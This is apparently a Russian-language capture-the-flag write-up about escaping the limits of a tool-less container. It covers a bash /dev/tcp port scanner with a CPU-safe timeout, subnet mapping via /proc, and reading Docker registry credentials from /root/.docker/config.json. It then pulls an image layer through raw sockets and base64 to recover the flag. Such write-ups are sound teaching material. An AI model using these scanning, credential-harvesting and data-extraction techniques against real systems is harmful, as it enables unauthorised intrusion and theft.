## Шаг 0. SSH не даёт выполнить команду напрямую

`ssh host 'id'` → `Sorry, no commands allowed. Just 'ssh user@host' please.`
Пайп в stdin тоже режут: `Only interactive TTY sessions are allowed.`
Значит нужен настоящий псевдотерминал. Поднял `expect` (`ssh -tt` +
`sshpass`), с маркерами `echo __START__` / `echo __END__$?` вокруг
команды, чтобы вычленять именно её вывод из шумного pty-эха.

## Шаг 1. Окружение — почти пустой scratch-контейнер

`compgen -c` показал, что кроме bash-билтинов в PATH есть только три
файла: `docker-init`, `bash`, `base64`. Ни `cat`, ни `ls`, ни `id`, ни
`ip`/`curl`/`python`/`tar`/`gzip`/`sleep`/`seq` — вообще ничего.
Корень ФС — только `/bin /dev /etc /proc /root /sbin /sys` (даже
`/tmp` нет). Мы `uid=0 gid=0` (`/proc/self/status`), но эскалировать
особо некуда — сам образ пуст.

Пришлось жить на голых bash-примитивах:
- чтение файла без `cat`: `printf '%s\n' "$(< /path)"` (bash умеет это
  нативно);
- `ls` — через globbing (`echo /bin/*`);
- парсинг hex-адресов из `/proc/net/route` (little-endian, байты в
  обратном порядке): `0B00007F` → `7F.00.00.0B` = `127.0.0.11`
  (совпало с docker-DNS в `/etc/resolv.conf` — проверка правильности
  формулы).

## Шаг 2. Открытие №1: каждый новый коннект — новый контейнер

Первая строка каждой SSH-сессии — `Booting up the challenge...`. И
IP-адрес контейнера **меняется при каждом переподключении** (ловил
10.0.4.x, 10.0.5.x, 10.0.6.x, 10.0.7.x, 10.0.10.x, 10.0.11.x,
10.0.13.x). Это означает: **весь recon + эксплуатация должны
уместиться в ОДНУ ssh-сессию**, одним большим bash-скриптом — иначе
теряется вся сетевая топология и состояние реестра образов (тэги тоже
пересоздаются каждый раз).

## Шаг 3. Открытие №2 (больнее): `ulimit -t 10`

Чтобы просканировать порт без внешних утилит, использовал
`exec 3<>/dev/tcp/$host/$port` в фоне + свой таймаут. Первая версия
таймаута — busy-poll (`while kill -0 $pid; do :; done`). После
~20 хостов **SSH обрывался**. Причина — `ulimit -a` показывает
`cpu time (seconds, -t) 10`: это **10 секунд именно CPU-времени**, а
busy-loop жрёт CPU почти 1:1 с wall-clock → SIGXCPU убивает bash и
рвёт сессию.

Проверил гипотезу: чистый блокирующий `read -t 30` (без busy-loop)
пережил 30 секунд, и `times` показал `0m0.000s 0m0.002s` — то есть
реального CPU почти не тратится. Значит лимит именно по CPU, а не по
wall-clock. Дальше была вторая засада: `read -t N`, запущенный **в
фоне** (`( read -t N; ... ) &`), возвращался мгновенно вместо ожидания
— bash молча подменяет stdin фоновых `&`-джобов на `/dev/null` для
интерактивной оболочки без job control, а чтение из `/dev/null` — это
мгновенный EOF. Фикс: таймер `read -t N` держать в **foreground**
(там stdin — реальный pty, ожидание настоящее), а не бэкграундить его.

Итоговый безопасный таймаут-коннект:
```bash
alive(){ host=$1;port=$2;to=$3
  (exec 3<>/dev/tcp/$host/$port) 2>/dev/null & cpid=$!
  read -t $to                       # foreground, реальный блок, ~0 CPU
  if kill -0 $cpid 2>/dev/null; then
    kill -9 $cpid 2>/dev/null; wait $cpid 2>/dev/null; return 2  # хоста нет
  else
    wait $cpid 2>/dev/null; return $?                            # 0=open 1=closed
  fi
}
```
Несуществующие IP в docker-бридже не отвечают на ARP → `connect()`
виснет надолго; существующие хосты сразу шлют RST. Это надёжно
отличает "хоста нет" от "хост есть, порт закрыт".

## Шаг 4. Топология сети

`/proc/net/route` даёт сеть+маску, свой IP — по `/proc/net/fib_trie`
(строка `... host LOCAL`, не 127.x). Полный обход `/26` (безопасным
таймаут-коннектом) в **каждом** из ~8 независимых запусков давал одну
и ту же картину:

| смещение | роль |
|---|---|
| network+1 | docker-бридж gateway (все порты закрыты) |
| network+2 | **соседний контейнер — цель** |
| network+3 | мы ("бот") |

## Шаг 5. Сосед — это Docker Registry API v2

`GET / HTTP/1.0` на `sib:5000` → `200 OK`, пустое тело.
`GET /v2/` → `401`, заголовок
`Docker-Distribution-Api-Version: registry/2.0` и
`Www-Authenticate: Basic realm="Registry"`. Это стоковый
`distribution/distribution` (собственный registry-сервер Docker) с
htpasswd Basic-auth. Перебор "тематических" C2-путей (`/bot`,
`/gate.php`, `/heartbeat`, `/panel`, ...) — везде честный 404 от Go
net/http, значит это не самописная C2-панель, а именно реестр образов.

## Шаг 6. Креды — в `/root/.docker/config.json`

Угадывание паролей (admin:admin, свои же ssh-креды и т.п.) — везде
401. Реальные креды нашлись прямо в контейнере:
```
$ echo /root/.docker/*
/root/.docker/config.json
$ printf '%s\n' "$(< /root/.docker/config.json)"

```
`base64 -d` → **`admin:strongpass`**. Логично: бот регулярно
пуллит/пушит образы в свой внутренний C2-реестр, поэтому у него
сохранён `docker login`.

## Шаг 8. Достаём слой без `tar`/`gzip` на борту

Последний элемент `manifest.layers[]` (185 байт — по размеру похоже
на маленький файл) — это и есть слой с флагом. Проблема: в bash нельзя
хранить NUL-байты в переменных, а gzip-поток их содержит. Решение —
скачать сырые байты по `/dev/tcp` и сразу прогнать через **единственный
доступный внешний бинарник** `base64`, ни разу не кладя их в
bash-переменную:
```bash
exec 3<>"/dev/tcp/$sib/5000"
printf 'GET /v2/fastapi/blobs/%s HTTP/1.1\r\n...\r\n\r\n' "$digest" >&3
base64 <&3          # чистый ASCII, безопасно копировать наружу
```
Вставил ASCII-вывод локально, декодировал, отрезал HTTP-заголовки по
`\r\n\r\n`, дальше — уже нормальный `tar.gz`, который локально
(где есть настоящие утилиты) распаковывается штатно:
```
$ base64 -D -i blob_b64.txt -o raw_response.bin
$ python3 -c "d=open('raw_response.bin','rb').read(); \
    open('layer.tar.gz','wb').write(d[d.find(b'\r\n\r\n')+4:])"
$ tar -xzf layer.tar.gz -C extracted
$ cat extracted/app/flag.txt
avito{the_bo7ne7_15_CompL3tely_ComPRomISed}
```
Сверено побайтово через `xxd`.

## Итог

`avito{the_bo7ne7_15_CompL3tely_ComPRomISed}`

**Цепочка:** пустой scratch-контейнер с одним внешним бинарником
(`base64`) → чисто bash-примитивами (без busy-loop — ловушка на
`ulimit -t 10`!) находим по `/proc/net/*` топологию `/26`-подсети →
на соседнем хосте поднят приватный Docker Registry → креды к нему
лежат прямо в файле `/root/.docker/config.json` (следы `docker
login` самого бота) → в каталоге реестра три образа, история сборки
`fastapi` выдаёт `COPY .../flag.txt` последним слоем → тянем именно
этот маленький слой через Registry Blob API, безопасно вывозим бинарные
байты наружу через `base64` (раз в контейнере нет `tar`/`gzip`,
распаковываем уже локально) → флаг.

**Урок:** "нет утилит" не значит "нет сети" и не значит "нельзя вывезти
бинарные данные" — `/dev/tcp` + `base64` заменяют `curl`+`scp`, если
не бояться пописать процедур на чистом bash. И: ephemeral-инстансы
(новый IP/новые тэги на каждый коннект) требуют all-in-one скриптов, а
не пошагового исследования между переподключениями.
